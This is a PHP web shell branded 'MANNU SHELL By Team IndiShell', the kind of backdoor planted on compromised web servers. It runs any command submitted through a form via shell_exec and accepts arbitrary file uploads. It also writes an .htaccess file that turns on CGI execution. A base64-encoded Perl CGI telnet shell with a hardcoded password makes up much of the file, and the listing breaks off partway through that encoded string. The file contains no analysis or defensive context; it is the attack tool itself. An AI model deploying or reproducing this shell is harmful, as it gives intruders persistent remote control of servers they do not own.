<?php



 $head = '
<html>
<head>
</script>
<title>--==[[MANNU SHELL By Team IndiShell]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border			: dashed 1px;
border-color		: #333;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
select {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 40%;
color: white;
}
textarea {
border			: dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin			: -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>'; ?>
<html>
	<head>
		<?php 
		echo $head ;
		echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

			

       <td width="100%" align=center valign="top" rowspan="1">
           <font color=red size=5 face="comic sans ms"><b>--==[[ MANNU SH</font><font color=white size=5 face="comic sans ms"><b>ELL By Team </font><font color=green size=5 face="comic sans ms"><b>IndiShell ]]==--</font> <div class="hedr"> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="1"><b> 
        <font color=red> 
        ####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font><br><font color=white>-==[[Greetz to]]==--</font><br>   Guru ji zero ,code breaker ica,R0ot_Devil,google_warrior,INX_r0ot,Darkwolf indishell,baba,Silent poison India,Magnum sniper,Atul Dwivedi,ethicalnoob Indishell,Local root indishell,Irfninja indishell<br>cool toad,cool shavik, Ebin V Thomas,Dinelson Amine ,Mr. Trojan,rad paul,Godzila,mike waals,Neo hacker ICA,Decoder,Th3 D3str0yer,cyber warrior,Golden boy INDIA,Ketan Singh,Yash,Reborn India,Alicks,Aneesh Dogra,silent hacker,lovetherisk<br>Suriya Prakash,cyber gladiator,Mr.52,Cyber Ace,hero,Minhal Mehdi ,Raj bhai ji,cold fire hacker,Prashant Tanwar, VikAs ViKi ,Rakesh, Bhuppi,Mohit, Ffe ^_^,Ashish,Shardhanand,Bhuppi and rest of TEAM INDISHELL<br>

<font color=white>--==[[Dedicated to]]==--</font>
<br># My Father and my Ex Teacher #<br><font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>GCE ke Don</font><br><font color=red> 
        ####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font>
						<a href="http://www.devilscafe.in"><font color=black>How To Hack</font></a>
           </table>
        

'; 
?>

</head>

<body bgcolor="black"><body bgcolor="black">
	
	<table border=1 width=100%><td width=15% align=right><font color=red size=-2 face="comic sans ms">uname<br>server_ip<br>your_ip<br>server_software<br>disabled_functions</td><td><?php echo "<font size=-2>".php_uname()  ;?>	<br><?php echo "<font size=-2>".gethostbyname($_SERVER["HTTP_HOST"]);?><br><?php echo $_SERVER['REMOTE_ADDR'];?><br><?php echo $s_software = getenv("SERVER_SOFTWARE"); ?><br><?php $r=ini_get('disable_functions') ? ini_get('disable_functions'):'none'; echo $r;?>
	</table><?php echo $head ; ?><table width=100% ><tr><td align=center width=60% >
	
	

<?php 

	if(!isset($_POST['sbexe']))
	{
	
							?>
						<textarea  name=output cols="100" rows="10" ><?php 
						$r="ls -la";
						echo shell_exec($r); ?></textarea>
						<?php
						
				}	
				
				else
				{
					
					if(isset($_POST['sbexe']))
	{
		echo "<font size=3>";
	$cmde=$_POST["cmex"];
	?><textarea  name=output cols="100" rows="10" ><?php echo shell_exec($cmde); ?></textarea>
	<?php
} }		
?>

<tr><td  align=center><font color=white size=3 face="comic sans ms">--==[[command 
	execution]]==--</font></font><form method=POST>
		
	<input type name=cmex >
	<input type=submit name=sbexe value='hex it' /></form>
	</td></tr>

	
	</table><table border=1 width=100%> <tr><td align=center><?php 
 
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; 
echo '<input type="file" name="file" size="50">&nbsp&nbsp&nbsp&nbsp<input  type="submit"  name="sut" value="Upload"></form>'; 
if( isset($_POST['sut']) )
 {
	  	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']))
	  	 { echo '<font color=red size=-2 face="comic sans ms">upload done<<br><br>'; } 	
	  	 else { echo '<font color=red size=-2 face="comic sans ms">Upload failed :P<br>'; } } 


?></table></table></table>

<table width=100%>
<td align=center><a href="<?php echo "?CGI" ; ?>"><font color=white size=3 face="comic sans ms"><b>--==[[---0---<font color=red size=2 face="comic sans ms">CGI Telnet</font><font color=white size=2 face="comic sans ms">----0---]]==--</a></table>
<?php
if(isset($_GET['CGI']))
{
error_reporting(0);

mkdir('i', 0777);
        $hope = fopen("i/.htaccess", 'w');
        $hcon= "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .root\nAddHandler cgi-script .root\nAddHandler cgi-script .root";    
        fwrite ( $hope, $hcon ) ;
    
$telnet=' IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjpyZWQiPmNnaSBzaGVsbDwvYj4gIyBzZXJ2ZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyDQojIHZhbHVlcyBzaG91bGQgd29yayBmaW5lIGZvciBtb3N0IHN5c3RlbXMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokUGFzc3dvcmQgPSAiaW5kaXNoZWxsIjsJICMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcw0KIyB0byBsb2dpbi4NCg0KJFdpbk5UID0gMDsJICMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYNCiMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQojIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLg0KDQokTlRDbWRTZXAgPSAiJiI7CSAjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNlcCA9ICI7IjsJICMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQojIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQojIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcw0KIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcw0KIyBpZ25vcmVkIG9uIE5UIFNlcnZlcnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CSAjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlDQojIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kDQojIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCiMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQojIGlzIGJlaW5nIGdlbmVyYXRlZC4NCg0KIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQ0KDQokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsNCiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsNCiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOw0KJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEiKTsNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0DQojIHBhcnNlcyBHRVQsIFBPU1QgYW5kIG11bHRpcGFydC9mb3JtLWRhdGEgdGhhdCBpcyB1c2VkIGZvciB1cGxvYWRpbmcgZmlsZXMuDQojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uDQojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mDQojIHRoZSB2YXJpYWJsZS4gTm90ZTogTW9zdCBvZiB0aGUgY29kZSBpbiB0aGlzIGZ1bmN0aW9uIGlzIHRha2VuIGZyb20gb3RoZXIgQ0dJDQojIHNjcmlwdHMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUmVhZFBhcnNlIA0Kew0KbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCmxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoNCiRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQppZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0Kew0KJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQplbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCnsNCmJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCnJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9DQoNCiMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCmlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0Kew0KJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyANCkBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IA0KJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCiRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsNCiRIZWFkZXIgPSAkYDsNCiRCb2R5ID0gJCc7DQokQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQokaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCiRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgDQokaW57J2YnfSA9ICQxOyANCiRpbnsnZid9ID1+IHMvXCIvL2c7DQokaW57J2YnfSA9fiBzL1xzLy9nOw0KDQojIHBhcnNlIHRyYWlsZXINCmZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQp7IA0KJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQokbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQoka2V5ID0gJDE7DQokdmFsID0gJCc7DQokdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiRpbnska2V5fSA9ICR2YWw7IA0KfQ0KfQ0KZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQp7DQpAaW4gPSBzcGxpdCgvJi8sICRpbik7DQpmb3JlYWNoICRpICgwIC4uICQjaW4pDQp7DQokaW5bJGldID1+IHMvXCsvIC9nOw0KKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCiRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQokdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQokaW57JGtleX0gLj0gJHZhbDsNCn0NCn0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQokRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQoNCiRIdG1sTWV0YUhlYWRlcg0KDQo8L2hlYWQ+DQo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iYmxhY2siIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCIgdGV4dD0iI0ZGMDAwMCI+DQo8YnI+PGRpdiBhbGlnbj1jZW50ZXI+PHRhYmxlIHN0eWxlPSJib3JkZXI6IDJweCBkYXNoZWQgcmVkIj48dHI+PHRkIGFsaWduPWNlbnRlcj48Yj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTI+DQo8Zm9udCBjb2xvcj13aGl0ZSBzaXplPTM+IENvbm5lY3RlZCB0byAkU2VydmVyTmFtZTwvYj48L2ZvbnQ+PGJyPg0KDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5VcGxvYWQgRmlsZTwvZm9udD48L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPkRvd25sb2FkIEZpbGU8L2ZvbnQ+PC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1sb2dvdXQiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5EaXNjb25uZWN0PC9mb250PjwvYT4gfA0KPC9mb250Pg0KPC90YWJsZT4NCg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBMb2dpbiBTY3JlZW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luU2NyZWVuDQp7DQokTWVzc2FnZSA9IHEkPGgyIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+PGltZyBib3JkZXI9IjAiIHNyYz0iaHR0cDovL2kubWluLnVzL2ljVmFTNi5wbmciPjxicj48Zm9udCBzaXplPTMgY29sb3I9d2hpdGUgZmFjZT0iY29taWMgc2FucyBtcyI+LS09PVtbIEJveCBPd25lZCBieSBUZWFtIElORElTSEVMTCBdXT09LS08L2ZvbnQ+DQokOw0KIycNCnByaW50IDw8RU5EOw0KPGNvZGU+JE1lc3NhZ2UNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxicj5sb2dpbjogYWRtaW48YnI+DQpwYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KPGZvbnQgc2l6ZT0iMyI+DQoNCnBhc3N3b3JkOjwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTkwMCIgc2l6ZT0iMyI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic3BpbiB0aGlzIHNoaXQiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCnByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeycnfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCkBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQpmb3JlYWNoICRjb29raWUoQGh0dHBjb29raWVzKQ0Kew0KKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOw0KJENvb2tpZXN7JGlkfSA9ICR2YWw7DQp9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBzY3JlZW4gd2hlbiB0aGUgdXNlciBsb2dzIG91dA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9nb3V0U2NyZWVuDQp7DQpwcmludCAiPGNvZGU+Q29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+PC9jb2RlPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCnByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUNCiZQcmludFBhZ2VIZWFkZXIoInAiKTsNCiZQcmludExvZ291dFNjcmVlbjsNCg0KJlByaW50TG9naW5TY3JlZW47DQomUHJpbnRMb2dpbkZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KaWYoJExvZ2luUGFzc3dvcmQgZXEgJFBhc3N3b3JkKSAjIHBhc3N3b3JkIG1hdGNoZWQNCnsNCnByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7DQomUHJpbnRQYWdlSGVhZGVyKCJjIik7DQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQplbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoDQp7DQomUHJpbnRQYWdlSGVhZGVyKCJwIik7DQomUHJpbnRMb2dpblNjcmVlbjsNCmlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFzc3dvcmQgd2FzIGVudGVyZWQNCnsNCiZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsNCg0KfQ0KJlByaW50TG9naW5Gb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCiRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOw0KcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dC